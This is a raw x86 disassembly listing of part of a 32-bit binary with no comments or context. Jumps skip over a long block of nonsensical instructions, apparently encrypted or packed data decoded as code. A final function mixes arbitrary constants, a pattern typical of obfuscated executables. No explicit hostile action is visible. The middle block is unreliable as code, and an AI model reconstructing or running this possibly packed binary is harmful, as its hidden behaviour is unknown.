  41148d:	mov    edx,DWORD PTR [esp+0x14]
  411491:	sub    DWORD PTR [eax],ecx
  411493:	sbb    DWORD PTR [eax+0x4],edx
  411496:	mov    eax,DWORD PTR [esp+0xc]
  41149a:	or     DWORD PTR [eax],0xcb7db576
  4114a0:	or     DWORD PTR [eax+0x4],0x9c2b8ae8
  4114a7:	lea    eax,[esp+0x18]
  4114ab:	jmp    0x41183a
  4114b0:	test   al,0x7c
  4114b2:	or     BYTE PTR [esp+ebx*1-0x44],ch
  4114b6:	lods   al,BYTE PTR ds:[esi]
  4114b7:	mov    esp,0x92465201
  4114bc:	mov    DWORD PTR [edx+0x54d4cfc1],0xc499bebe
  4114c6:	mov    esi,0xd8e82ebe
  4114cb:	ret    
  4114cc:	cmp    edi,esp
  4114ce:	xchg   esi,eax
  4114cf:	jne    0x411497
  4114d1:	int3   
  4114d2:	iretw  
  4114d4:	aad    0x8c
  4114d6:	push   esp
  4114d7:	push   edi
  4114d8:	adc    BYTE PTR [ecx+0x64587ca2],ch
  4114de:	fiadd  WORD PTR [esi+0x34]
  4114e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114e2:	lods   eax,DWORD PTR ds:[esi]
  4114e3:	imul   ebp,DWORD PTR [edx+0x3d],0xfffffff0
  4114e7:	mov    cs,WORD PTR [ecx+ebp*8+0xa4a037a]
  4114ee:	xchg   BYTE PTR [ecx-0xd3c134a],al
  4114f4:	xchg   edi,eax
  4114f5:	nop
  4114f6:	mov    bl,0xcd
  4114f8:	rcr    DWORD PTR [esi-0x1b],1
  4114fb:	jb     0x4114b2
  4114fd:	loop   0x41152c
  4114ff:	push   es
  411500:	mov    eax,ds:0x87d35e41
  411505:	cwde   
  411506:	mov    esp,0x4b07dac3
  41150b:	inc    edi
  41150c:	dec    esi
  41150d:	mov    cl,0x1d
  41150f:	push   esp
  411510:	fisubr DWORD PTR [edx-0x52]
  411513:	out    dx,al
  411514:	pop    ss
  411515:	push   esp
  411516:	mov    BYTE PTR ds:0xad2a8b67,cl
  41151c:	ret    0x6938
  41151f:	shl    BYTE PTR [eax-0x22],1
  411522:	pop    ebx
  411523:	jno    0x411565
  411525:	lds    ecx,FWORD PTR [esi]
  411527:	adc    BYTE PTR [eax-0x5d],cl
  41152a:	push   ecx
  41152b:	adc    BYTE PTR [ecx-0x642901f5],al
  411531:	mov    edi,0xdb15205
  411536:	mov    esp,0xc3f4bc8e
  41153b:	mov    cl,BYTE PTR [edx-0x2ff5e90b]
  411541:	test   BYTE PTR [esi+0x5fa8e3cf],bl
  411547:	test   eax,0x97bb7db1
  41154c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41154d:	pop    edx
  41154e:	pushf  
  41154f:	out    0x6e,eax
  411551:	xor    ecx,DWORD PTR [edi+0x1]
  411554:	mov    eax,0x6279eab8
  411559:	outs   dx,BYTE PTR ds:[esi]
  41155a:	cmp    eax,0x3ff9b79b
  41155f:	les    esi,FWORD PTR [eax+ebx*8+0x17df40c2]
  411566:	neg    ebp
  411568:	mov    bl,0xf6
  41156a:	and    bl,BYTE PTR [edx]
  41156c:	jns    0x4115c6
  41156e:	xchg   edi,eax
  41156f:	or     eax,0x8536c008
  411574:	sar    dh,0xe9
  411577:	mov    dh,0xbf
  411579:	inc    ebx
  41157a:	sbb    esp,DWORD PTR [eax]
  41157c:	xchg   ecx,eax
  41157d:	(bad)
  411581:	stos   BYTE PTR es:[edi],al
  411582:	jb     0x41157a
  411584:	xchg   BYTE PTR [eax+0x4b1151d],cl
  41158a:	mov    edi,0x2a192593
  41158f:	leave  
  411590:	cs dec ecx
  411592:	jge    0x41157b
  411594:	pop    ss
  411595:	cld    
  411596:	mov    dl,0x61
  411598:	aas    
  411599:	aas    
  41159a:	lods   eax,DWORD PTR ds:[esi]
  41159b:	ficomp WORD PTR [edi]
  41159d:	push   cs
  41159e:	xchg   esp,eax
  41159f:	push   eax
  4115a0:	adc    dh,BYTE PTR [esi-0xe79ae20]
  4115a6:	push   esi
  4115a7:	loop   0x411569
  4115a9:	mov    eax,0x23115750
  4115ae:	dec    ebx
  4115af:	popa   
  4115b0:	test   dl,cl
  4115b2:	test   DWORD PTR [eax],esp
  4115b4:	call   0x1443:0xd00b541
  4115bb:	adc    DWORD PTR [ebx],0xffffffe1
  4115be:	(bad)  
  4115bf:	jmp    0x8c47:0x88ef6978
  4115c6:	dec    ecx
  4115c7:	imul   edx,ecx,0x4e688963
  4115cd:	cmp    eax,0x3b56d8f0
  4115d2:	pop    esi
  4115d3:	(bad)  
  4115d4:	icebp  
  4115d5:	or     eax,0x292a9aec
  4115da:	push   es
  4115db:	enter  0x20a5,0xe
  4115df:	rol    ebx,0x6b
  4115e2:	fidivr DWORD PTR [esi+0x7f]
  4115e5:	push   ebx
  4115e6:	imul   esi,DWORD PTR [eax+0x31],0xffffff9f
  4115ea:	sub    ebp,0x111667dc
  4115f0:	ret    0x7c50
  4115f3:	inc    ebx
  4115f4:	(bad)  
  4115f5:	call   0x83aa:0xfd557dc4
  4115fc:	jnp    0x41162a
  4115fe:	out    dx,eax
  4115ff:	je     0x411640
  411601:	add    al,al
  411603:	and    eax,0xb2717049
  411608:	leave  
  411609:	dec    cl
  41160b:	mov    edx,ebp
  41160d:	stos   BYTE PTR es:[edi],al
  41160e:	int    0x35
  411610:	addr16 out 0x1,eax
  411613:	push   0xf282c259
  411618:	sbb    esp,ecx
  41161a:	clc    
  41161b:	xor    DWORD PTR [eax-0x56b65336],0x7557a529
  411625:	call   0xe9b4:0x3ae76001
  41162c:	cmp    al,ah
  41162e:	ret    
  41162f:	imul   ebx,edx,0xd4d28184
  411635:	sti    
  411636:	push   ebx
  411637:	dec    ecx
  411638:	lods   eax,DWORD PTR ds:[esi]
  411639:	addr16 ror ecx,1
  41163c:	ret    
  41163d:	push   ebx
  41163e:	dec    esi
  41163f:	(bad)  
  411640:	jp     0x41161a
  411642:	adc    ecx,ebx
  411644:	lods   al,BYTE PTR ds:[esi]
  411645:	test   al,0x68
  411647:	xlat   BYTE PTR ds:[ebx]
  411648:	xchg   BYTE PTR [ebx-0x48763cbc],cl
  41164e:	call   0x5dce:0x6513003e
  411655:	rcr    DWORD PTR [edx],0x1f
  411658:	mov    ds:0xbbe0e21b,al
  41165d:	push   edi
  41165e:	dec    ebx
  41165f:	jb     0x411626
  411661:	iret   
  411662:	inc    esi
  411663:	adc    ah,0x5d
  411666:	xlat   BYTE PTR ds:[ebx]
  411667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411668:	adc    BYTE PTR [ecx-0x23],cl
  41166b:	(bad)  
  41166c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41166d:	ret    
  41166e:	cmp    edi,DWORD PTR [edi+ecx*4-0x65461594]
  411675:	pop    edx
  411676:	stos   BYTE PTR es:[edi],al
  411677:	std    
  411678:	jg     0x4116d9
  41167a:	loop   0x41169f
  41167c:	out    dx,eax
  41167d:	adc    eax,DWORD PTR [ecx]
  41167f:	cwde   
  411680:	pop    eax
  411681:	mov    DWORD PTR [eax+ebx*1-0x1d],esp
  411685:	push   edi
  411686:	call   0x98ccc171
  41168b:	xor    al,0x56
  41168d:	pop    eax
  41168e:	add    cl,dl
  411690:	out    dx,al
  411691:	sti    
  411692:	pop    ebp
  411693:	imul   ecx,DWORD PTR [edi+eiz*8-0x1e1f23eb],0x50
  41169b:	adc    BYTE PTR [ebx-0x2bdc088a],0xb0
  4116a2:	int    0xb1
  4116a4:	cdq    
  4116a5:	mov    ah,BYTE PTR [ecx]
  4116a7:	or     al,0x83
  4116a9:	ja     0x4116e0
  4116ab:	inc    edx
  4116ac:	(bad)  
  4116ad:	cli    
  4116ae:	imul   eax,esi,0xffffffa4
  4116b1:	in     eax,0x30
  4116b3:	leave  
  4116b4:	mov    edx,0x522febf
  4116b9:	jmp    0x6f50:0x44b0f01
  4116c0:	adc    al,0xf5
  4116c2:	sub    ebp,eax
  4116c4:	clc    
  4116c5:	fdivp  st(1),st
  4116c7:	mov    edi,0x8c6d7f3c
  4116cc:	lahf   
  4116cd:	repnz push cs
  4116cf:	xor    al,0x21
  4116d1:	dec    edx
  4116d2:	dec    esp
  4116d3:	fadd   QWORD PTR [edx]
  4116d5:	and    bh,cl
  4116d7:	pop    ebp
  4116d8:	cld    
  4116d9:	stos   BYTE PTR es:[edi],al
  4116da:	xchg   esi,eax
  4116db:	(bad)  
  4116dc:	pop    esp
  4116dd:	fdivr  QWORD PTR [ecx-0x73]
  4116e0:	push   ebx
  4116e1:	js     0x4116ce
  4116e3:	push   cs
  4116e4:	jmp    0x411752
  4116e6:	iret   
  4116e7:	jmp    DWORD PTR [ebp+0x72b303f2]
  4116ed:	adc    BYTE PTR [esi],dh
  4116ef:	int    0x6b
  4116f1:	cmp    cl,BYTE PTR [ecx+0x32030ece]
  4116f7:	mov    ebp,0x93cfd8e
  4116fc:	ds cs cmp eax,0xf496b621
  411703:	(bad)  
  411704:	ds or  eax,0x583157f2
  41170a:	aad    0x2d
  41170c:	or     bh,BYTE PTR [edi]
  41170e:	inc    esi
  41170f:	jne    0x411763
  411711:	mov    cl,0xb7
  411713:	xlat   BYTE PTR ds:[ebx]
  411714:	sbb    dh,ch
  411716:	mov    DWORD PTR [esi-0x1b],0xeae528b1
  41171d:	dec    esi
  41171e:	sub    eax,0xb741015
  411723:	dec    esp
  411724:	lods   al,BYTE PTR ds:[esi]
  411725:	adc    eax,0xd94e1ff7
  41172a:	cmp    BYTE PTR [ebx],ah
  41172c:	mov    ecx,0xccc6afea
  411731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411732:	outs   dx,DWORD PTR ds:[esi]
  411733:	adc    eax,0x1637d41b
  411738:	jnp    0x41170e
  41173a:	push   ebx
  41173b:	mov    bh,0xc4
  41173d:	in     al,dx
  41173e:	retf   
  41173f:	sub    al,BYTE PTR [edi]
  411741:	jecxz  0x411707
  411743:	hlt    
  411744:	pop    ds
  411745:	and    eax,0x628d87ff
  41174a:	fisub  DWORD PTR [edi+edi*4+0xd]
  41174e:	loopne 0x41170d
  411750:	outs   dx,DWORD PTR ds:[esi]
  411751:	add    BYTE PTR [esi-0x578ea205],dl
  411757:	aad    0xd
  411759:	xor    DWORD PTR [ebp-0x2c63a34f],edi
  41175f:	sbb    eax,0x9a2371c6
  411764:	pop    ebp
  411765:	inc    eax
  411766:	sub    eax,0xd7528f31
  41176b:	xchg   DWORD PTR [ecx],edi
  41176d:	jmp    0x4116fd
  41176f:	adc    edx,ecx
  411771:	dec    esi
  411772:	or     eax,DWORD PTR [edi]
  411774:	popa   
  411775:	test   DWORD PTR ds:0x372e242,0x825421aa
  41177f:	or     DWORD PTR [ecx+0x5f555312],edi
  411785:	bound  eax,QWORD PTR [ebx]
  411787:	call   0x6caae370
  41178c:	cmp    BYTE PTR [esi-0x3dc1b760],cl
  411792:	dec    eax
  411793:	pop    esp
  411794:	fmul   QWORD PTR [ecx]
  411797:	scas   al,BYTE PTR es:[edi]
  411798:	adc    ecx,DWORD PTR [ecx]
  41179a:	mov    edi,0xcc1331e2
  41179f:	pop    ecx
  4117a0:	add    edx,esp
  4117a2:	sbb    eax,0x6fc47be8
  4117a7:	mov    edi,0x6a665c47
  4117ac:	xlat   BYTE PTR ds:[ebx]
  4117ad:	xor    dh,BYTE PTR [ecx+esi*8+0x36]
  4117b1:	sub    al,0xf8
  4117b3:	push   eax
  4117b4:	sub    BYTE PTR [ebx-0x6086f6cb],dl
  4117ba:	repnz adc BYTE PTR [ebp-0x70],ah
  4117be:	push   edi
  4117bf:	ja     0x41179f
  4117c1:	out    0x35,al
  4117c3:	ins    DWORD PTR es:[edi],dx
  4117c4:	inc    edx
  4117c5:	mov    edx,0x577dbb0f
  4117ca:	xchg   esp,eax
  4117cb:	scas   eax,DWORD PTR es:[edi]
  4117cc:	ss fs dec esp
  4117cf:	mov    dh,0x4c
  4117d1:	mov    es,esp
  4117d3:	mov    BYTE PTR [eax],al
  4117d5:	cmp    BYTE PTR [ebx],dl
  4117d7:	add    al,0xbe
  4117d9:	adc    cl,0x2b
  4117dc:	and    BYTE PTR [edx-0x54],0x22
  4117e0:	pop    esi
  4117e1:	(bad)  
  4117e2:	xchg   ecx,eax
  4117e3:	mov    edx,0xef80c5b1
  4117e8:	stc    
  4117e9:	pop    ss
  4117ea:	shl    BYTE PTR [edx+eiz*4+0x5c],1
  4117ee:	arpl   WORD PTR [edi],bx
  4117f0:	test   DWORD PTR [edi+0x53],edx
  4117f3:	ror    DWORD PTR [ebp-0x75],0x78
  4117f7:	mov    ebp,0xb1d829a3
  4117fc:	rcl    BYTE PTR [edx],1
  4117fe:	in     al,0xe4
  411800:	stos   DWORD PTR es:[edi],eax
  411801:	jecxz  0x4117a8
  411803:	mov    ds:0x729aa095,eax
  411808:	jmp    0xddfb:0xa7719fc
  41180f:	cmp    BYTE PTR [si+0x29cd],dl
  411814:	jnp    0x411818
  411816:	xchg   edx,eax
  411817:	xchg   edi,eax
  411818:	and    al,0x56
  41181a:	dec    esp
  41181b:	(bad)  
  41181c:	test   eax,0x951d1738
  411821:	lock mov eax,0x5890004e
  411827:	jno    0x4117ed
  411829:	adc    al,0x83
  41182b:	mov    bl,dh
  41182d:	push   ds
  41182e:	int    0x2
  411830:	lods   eax,DWORD PTR ds:[esi]
  411831:	leave  
  411832:	test   BYTE PTR [eax+eax*8-0x1d05e7e6],dl
  411839:	popf   
  41183a:	push   eax
  41183b:	jmp    0x411bca
  411840:	xlat   BYTE PTR ds:[ebx]
  411841:	xchg   ebx,eax
  411842:	push   edx
  411843:	call   FWORD PTR [edx-0x30636400]
  411849:	fist   WORD PTR [eax-0x1a66e870]
  41184f:	jecxz  0x411800
  411851:	pop    edx
  411852:	mov    esi,0xbec499be
  411857:	mov    esi,0x946b0bed
  41185c:	popf   
  41185d:	xor    al,0x7b
  41185f:	xor    bl,BYTE PTR [eax-0x23]
  411862:	cmc    
  411863:	add    DWORD PTR [ebx+0x66e1abca],ebp
  411869:	pop    ds
  41186a:	sbb    BYTE PTR [edi-0x1396e85b],bh
  411870:	retf   0x4030
  411873:	outs   dx,DWORD PTR ss:[esi]
  411875:	cmove  edi,DWORD PTR [edi+0x2]
  411879:	(bad)  
  41187a:	push   ebp
  41187b:	or     DWORD PTR [edi],ecx
  41187d:	pop    eax
  41187e:	scas   al,BYTE PTR es:[edi]
  41187f:	push   ss
  411880:	out    dx,al
  411881:	cld    
  411882:	add    ecx,DWORD PTR [edi-0x33260215]
  411888:	jg     0x411859
  41188a:	or     ecx,eax
  41188c:	(bad)  [edi]
  41188e:	punpckhwd mm1,QWORD PTR [edx]
  411891:	ss adc al,0xa7
  411894:	xchg   esi,eax
  411895:	mov    edx,0x9c6c7624
  41189a:	lahf   
  41189b:	aam    0x75
  41189d:	stc    
  41189e:	call   0x874ccf46
  4118a3:	add    eax,ebp
  4118a5:	sub    esp,ebx
  4118a7:	push   es
  4118a8:	mov    ecx,DWORD PTR [edx-0x4]
  4118ab:	cdq    
  4118ac:	pushf  
  4118ad:	sbb    DWORD PTR [eax-0x3357d91a],0x662bbc0d
  4118b7:	cdq    
  4118b8:	ja     0x411896
  4118ba:	mov    dh,BYTE PTR [edi-0x45]
  4118bd:	test   DWORD PTR [ebx+ecx*8-0x2f],edi
  4118c1:	add    esp,ebx
  4118c3:	outs   dx,DWORD PTR ds:[esi]
  4118c4:	pop    es
  4118c5:	adc    DWORD PTR [esi-0x15668e90],edx
  4118cb:	outs   dx,BYTE PTR ds:[esi]
  4118cc:	aas    
  4118cd:	sub    cl,0x59
  4118d0:	push   eax
  4118d1:	xor    bl,BYTE PTR [ebp-0x31]
  4118d4:	or     DWORD PTR [ecx+0x6b4ba5df],ecx
  4118da:	dec    edx
  4118db:	scas   al,BYTE PTR es:[edi]
  4118dc:	adc    DWORD PTR [ecx],ebx
  4118de:	push   0xffffffad
  4118e0:	mov    bh,0xef
  4118e2:	xchg   ebp,eax
  4118e3:	dec    eax
  4118e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118e5:	mov    al,0x1c
  4118e7:	in     eax,dx
  4118e8:	add    al,0xdb
  4118ea:	and    DWORD PTR [ecx],ebp
  4118ec:	adc    al,0x27
  4118ee:	neg    DWORD PTR [ebp+0x72]
  4118f1:	in     eax,0xba
  4118f3:	cdq    
  4118f4:	lds    ecx,FWORD PTR [ebp+0x19]
  4118f7:	sbb    al,0x1e
  4118f9:	rol    BYTE PTR [ebx-0x65ade00e],1
  4118ff:	mov    dl,0x98
  411901:	inc    ecx
  411902:	loopne 0x4118d5
  411904:	cmp    bl,BYTE PTR [ecx]
  411906:	jnp    0x41196a
  411908:	push   ecx
  411909:	mov    DWORD PTR fs:[edx],0x2e90fc2b
  411910:	jmp    0x7cf95b9
  411915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411916:	dec    esp
  411917:	bound  ebx,QWORD PTR [ebp+ebp*4-0x226fc136]
  41191e:	sbb    al,0x27
  411920:	inc    ecx
  411921:	out    0x67,eax
  411923:	arpl   WORD PTR [ebx-0x15],bx
  411926:	add    eax,0x2faf4032
  41192b:	inc    eax
  41192c:	pop    ds
  41192d:	scas   eax,DWORD PTR es:[edi]
  41192e:	repz inc esi
  411930:	popa   
  411931:	lods   eax,DWORD PTR ds:[esi]
  411932:	adc    al,0x84
  411934:	xchg   edi,eax
  411935:	or     bh,BYTE PTR [esp+eax*1]
  411938:	jl     0x411973
  41193a:	ins    DWORD PTR es:[edi],dx
  41193b:	mov    ch,0x2c
  41193d:	and    DWORD PTR [edi-0x6d],eax
  411940:	repz push esi
  411942:	and    DWORD PTR [esi+eiz*1+0x5a45e141],ebp
  411949:	adc    DWORD PTR [edx-0x11],esi
  41194c:	bswap  esp
  41194e:	daa    
  41194f:	jne    0x411913
  411951:	pop    es
  411952:	scas   al,BYTE PTR es:[edi]
  411953:	xor    al,0x71
  411955:	mov    esi,0x71752cae
  41195a:	gs js  0x411939
  41195d:	mov    ch,0x72
  41195f:	jae    0x41197f
  411961:	pop    ds
  411962:	imul   edx,eax,0x1
  411965:	dec    esi
  411966:	jmp    0x5040c3af
  41196b:	mov    eax,0xaf3ea6d5
  411970:	xchg   ecx,eax
  411971:	rcl    BYTE PTR [esi],1
  411973:	mov    ebp,0x3596a467
  411978:	sbb    al,0x2e
  41197a:	mov    ch,BYTE PTR [edi+0x5b0347c1]
  411980:	icebp  
  411981:	arpl   WORD PTR [ebx+edi*8],sp
  411984:	std    
  411985:	add    eax,0xbbf3eef4
  41198a:	jb     0x411a08
  41198c:	inc    eax
  41198d:	mov    ds:0x645326f9,al
  411992:	hlt    
  411993:	out    0xb5,al
  411995:	mov    edi,0x7c7bbdf4
  41199a:	cli    
  41199b:	out    0x5,al
  41199d:	adc    BYTE PTR [ecx-0x3422af3b],ah
  4119a3:	arpl   cx,si
  4119a5:	and    dh,dh
  4119a7:	rcl    BYTE PTR [eax+0x48c4f8f8],cl
  4119ad:	clts   
  4119af:	popa   
  4119b0:	cdq    
  4119b1:	xchg   esi,eax
  4119b2:	fsubr  DWORD PTR [ebp+0x38]
  4119b5:	pop    ecx
  4119b6:	adc    esi,DWORD PTR [ebx+0x4c]
  4119b9:	cmp    eax,0x4cb88a18
  4119be:	cmp    bh,BYTE PTR [edi+0x1f9bb38e]
  4119c4:	daa    
  4119c5:	sub    ebx,DWORD PTR [ecx-0x22556f8e]
  4119cb:	add    al,0x88
  4119cd:	mov    al,0x76
  4119cf:	jb     0x411a10
  4119d1:	mov    al,ds:0xc5fbaa33
  4119d6:	retf   0x8b71
  4119d9:	mov    al,0x8e
  4119db:	mov    dl,0xfa
  4119dd:	push   ds
  4119de:	(bad)  
  4119df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119e0:	jp     0x4119f3
  4119e2:	imul   esp,ebx,0x2168550f
  4119e8:	stos   DWORD PTR es:[edi],eax
  4119e9:	jnp    0x411a53
  4119eb:	sub    ebp,esi
  4119ed:	mov    ch,0x46
  4119ef:	push   eax
  4119f0:	mov    bh,0xbf
  4119f2:	jne    0x4119a6
  4119f4:	fmul   QWORD PTR [ecx]
  4119f6:	jl     0x411a30
  4119f8:	daa    
  4119f9:	call   0xe2fd:0x3d51d19f
  411a00:	cmp    eax,0xc4bc3af9
  411a05:	dec    eax
  411a06:	pop    ds
  411a07:	jle    0x4119ec
  411a09:	sti    
  411a0a:	xchg   edx,eax
  411a0b:	cmp    DWORD PTR [esi],0xe253998b
  411a11:	cld    
  411a12:	dec    esp
  411a13:	ins    BYTE PTR es:[edi],dx
  411a14:	and    bl,ah
  411a16:	push   ebx
  411a17:	inc    ecx
  411a18:	and    eax,0xdfb10702
  411a1d:	sbb    eax,0x14245c9d
  411a22:	test   eax,0xa9dc8622
  411a27:	adc    ecx,ecx
  411a29:	xor    BYTE PTR [edi],bl
  411a2b:	sub    BYTE PTR [esp+edi*8+0x4f],bh
  411a2f:	mov    esp,0x1ddb25ef
  411a34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a35:	xchg   ax,ax
  411a37:	adc    al,0x91
  411a39:	cdq    
  411a3a:	and    ebx,ebx
  411a3c:	adc    al,0x84
  411a3e:	(bad)  
  411a3f:	daa    
  411a40:	mov    bh,0xe6
  411a42:	stc    
  411a43:	pop    esi
  411a44:	fwait
  411a45:	mov    edi,es
  411a47:	add    DWORD PTR [eax-0xb6dd0f6],ebp
  411a4d:	(bad)  
  411a4e:	fst    DWORD PTR [ecx]
  411a50:	loope  0x411a94
  411a52:	mov    cl,0xa8
  411a54:	jge    0x411a96
  411a56:	pusha  
  411a57:	and    eax,DWORD PTR [edi+0x1e]
  411a5a:	cmc    
  411a5b:	push   esp
  411a5c:	xor    BYTE PTR ds:0x28b43b16,al
  411a62:	rol    DWORD PTR [edi],cl
  411a64:	retf   0xf9d7
  411a67:	sar    BYTE PTR [edi],0xc1
  411a6a:	int3   
  411a6b:	out    0x10,eax
  411a6d:	(bad)  
  411a6e:	cmc    
  411a6f:	loopne 0x4119f4
  411a71:	mov    al,0x92
  411a73:	jnp    0x411ae5
  411a75:	add    ebp,ebx
  411a77:	std    
  411a78:	out    0x8c,eax
  411a7a:	fild   QWORD PTR [eax+0x325269c5]
  411a80:	lahf   
  411a81:	cmp    eax,0x939f4c3f
  411a86:	fsub   DWORD PTR [esi+0x18]
  411a89:	sbb    BYTE PTR [ebp-0x39db9e85],ch
  411a8f:	xor    dh,dl
  411a91:	pop    ss
  411a92:	lds    eax,FWORD PTR [edi-0x4c4b3e]
  411a98:	sub    eax,0xbe66bb14
  411a9d:	dec    ecx
  411a9e:	pushf  
  411a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411aa0:	fidivr DWORD PTR [edx]
  411aa2:	in     eax,0xeb
  411aa4:	and    bl,ch
  411aa6:	mov    ds:0x9fe5cb61,eax
  411aab:	sub    bl,BYTE PTR [ebp-0x3b]
  411aae:	popa   
  411aaf:	push   esi
  411ab0:	xor    al,0x9d
  411ab2:	ret    0x97de
  411ab5:	and    al,0xb5
  411ab7:	call   0xaa7f3fd3
  411abc:	fstp   TBYTE PTR [ecx-0x33]
  411abf:	(bad)  
  411ac0:	push   0x4a84ce81
  411ac5:	lods   al,BYTE PTR ds:[esi]
  411ac6:	repnz imul eax,DWORD PTR [ebx],0x4c
  411aca:	cwde   
  411acb:	pop    ds
  411acc:	fs push ecx
  411ace:	inc    esp
  411acf:	shl    dl,cl
  411ad1:	test   BYTE PTR [edi],0x5a
  411ad4:	enter  0x80e9,0xd6
  411ad8:	popf   
  411ad9:	adc    BYTE PTR [edi+0x38],0x5
  411add:	out    0x4c,eax
  411adf:	adc    dl,BYTE PTR [ecx-0x359db357]
  411ae5:	fcmovnu st,st(3)
  411ae7:	sahf   
  411ae8:	xor    eax,0x4194da5c
  411aed:	fdiv   QWORD PTR [eax+0x77]
  411af0:	pop    edx
  411af1:	mov    cl,0xe8
  411af3:	inc    edi
  411af4:	xchg   ebp,eax
  411af5:	add    BYTE PTR [ebx],bl
  411af7:	int3   
  411af8:	push   edx
  411af9:	xor    bh,BYTE PTR [eax+0x5ff45c2f]
  411aff:	rcr    edi,1
  411b01:	dec    eax
  411b02:	ins    BYTE PTR es:[edi],dx
  411b03:	lock enter 0x2a4,0xa7
  411b08:	add    ebx,ebx
  411b0a:	addr16 cwde 
  411b0c:	inc    edx
  411b0d:	in     eax,dx
  411b0e:	and    al,0xeb
  411b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b11:	pop    ss
  411b12:	mov    ebx,0x674af82c
  411b17:	cmp    bl,BYTE PTR [edx]
  411b19:	jo     0x411b20
  411b1b:	mov    edi,ecx
  411b1d:	pushf  
  411b1e:	sub    eax,0xf6ec7ae5
  411b23:	sbb    esp,edi
  411b25:	xchg   ebx,eax
  411b26:	outs   dx,BYTE PTR ds:[esi]
  411b27:	pusha  
  411b28:	pop    esp
  411b29:	fsubr  DWORD PTR [edi+0x6ed3fe82]
  411b2f:	arpl   sp,si
  411b31:	cmp    al,0x59
  411b33:	out    0x86,al
  411b35:	rcr    DWORD PTR [ebx+0x5],cl
  411b38:	stos   BYTE PTR es:[edi],al
  411b39:	rcr    ebx,0x5f
  411b3c:	mov    bl,0x94
  411b3e:	lods   al,BYTE PTR ds:[esi]
  411b3f:	xor    ch,BYTE PTR [edi]
  411b41:	inc    edi
  411b42:	jmp    0x411b1b
  411b44:	push   es
  411b45:	mov    bl,0xa8
  411b47:	leave  
  411b48:	sar    BYTE PTR [esi-0x32],0x67
  411b4c:	addr16 in eax,dx
  411b4e:	push   ss
  411b4f:	sub    BYTE PTR [esi-0x7a],bl
  411b52:	jmp    0xdb76:0xc8804650
  411b59:	out    0xbe,al
  411b5b:	xchg   edx,eax
  411b5c:	push   ds
  411b5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b5e:	add    dl,BYTE PTR [ebx]
  411b60:	mov    bh,0xbe
  411b62:	jle    0x411b08
  411b64:	clc    
  411b65:	inc    esp
  411b66:	xchg   bl,dh
  411b68:	stc    
  411b69:	retf   0xfc6a
  411b6c:	mov    bh,0xba
  411b6e:	mov    BYTE PTR [esi+0x34],cl
  411b71:	xor    BYTE PTR [ebp+0x2c],dl
  411b74:	cmp    bl,BYTE PTR [edi]
  411b76:	jp     0x411b83
  411b78:	mov    dl,0x69
  411b7a:	sbb    esi,DWORD PTR [ebx]
  411b7c:	add    BYTE PTR [ebx],ah
  411b7e:	repz xchg ebx,eax
  411b80:	pop    edx
  411b81:	das    
  411b82:	jo     0x411bc1
  411b84:	jne    0x411b3f
  411b86:	cld    
  411b87:	jle    0x411b67
  411b89:	mov    ecx,DWORD PTR [eax]
  411b8b:	inc    esp
  411b8c:	enter  0x8fe1,0x99
  411b90:	sub    DWORD PTR [ebx-0xed9f6c1],0x3f
  411b97:	mov    ebx,0xda65fe70
  411b9c:	ss xchg ebp,eax
  411b9e:	mov    edi,0xd9830433
  411ba3:	xchg   ebp,eax
  411ba4:	lds    ebx,FWORD PTR [ecx]
  411ba6:	adc    al,0xc7
  411ba8:	xor    eax,0x8f02b127
  411bad:	cmp    al,0xce
  411baf:	stc    
  411bb0:	xor    ebx,DWORD PTR [edx+0x3c49d039]
  411bb6:	mov    ds:0xc8f7f2cb,eax
  411bbb:	and    al,0x2f
  411bbd:	push   ds
  411bbe:	mov    fs,WORD PTR [ebx+esi*2+0x2f]
  411bc2:	jo     0x411b64
  411bc4:	push   ss
  411bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bc6:	neg    dh
  411bc8:	mov    ebp,DWORD PTR [esi]
  411bca:	lea    eax,[esp+0x24]
  411bce:	push   eax
  411bcf:	call   0x40f1e1
  411bd4:	mov    eax,DWORD PTR [esp+0x18]
  411bd8:	mov    ecx,DWORD PTR [esp+0x1c]
  411bdc:	push   DWORD PTR [ebp+0x18]
  411bdf:	mov    ebx,DWORD PTR [ebp+0xc]
  411be2:	push   DWORD PTR [ebp+0x14]
  411be5:	mov    esi,DWORD PTR [ebp+0x8]
  411be8:	push   DWORD PTR [ebp+0x10]
  411beb:	push   DWORD PTR [esp+0x20]
  411bef:	push   DWORD PTR [esp+0x20]
  411bf3:	push   DWORD PTR [esp+0x38]
  411bf7:	push   DWORD PTR [esp+0x38]
  411bfb:	call   0x401000
  411c00:	pop    esi
  411c01:	pop    ebx
  411c02:	mov    esp,ebp
  411c04:	pop    ebp
  411c05:	ret    0x14
  411c08:	push   ebp
  411c09:	mov    ebp,esp
  411c0b:	sub    esp,0x30
  411c0e:	mov    DWORD PTR [ebp-0x24],0x7c16
  411c15:	mov    DWORD PTR [ebp-0x20],0x53bd
  411c1c:	mov    DWORD PTR [ebp-0x18],0x3bd5
  411c23:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  411c2a:	mov    DWORD PTR [ebp-0xc],0x4b9d
  411c31:	mov    DWORD PTR [ebp-0x8],0x7e48
  411c38:	mov    DWORD PTR [ebp-0x4],0x604b
  411c3f:	mov    DWORD PTR [ebp-0x30],0x5b69
  411c46:	mov    DWORD PTR [ebp-0x2c],0x4521
  411c4d:	mov    DWORD PTR [ebp-0x28],0x2979
  411c54:	mov    DWORD PTR [ebp-0x14],0x9e8
  411c5b:	mov    DWORD PTR [ebp-0x10],0x40e5
  411c62:	mov    ecx,DWORD PTR [ebp-0x4]
  411c65:	mov    eax,DWORD PTR [ebp-0x8]
  411c68:	add    ecx,0x1d04
  411c6e:	xor    ecx,eax
  411c70:	mov    eax,DWORD PTR [ebp-0xc]
  411c73:	and    ecx,0x6f79
  411c79:	imul   ecx,eax
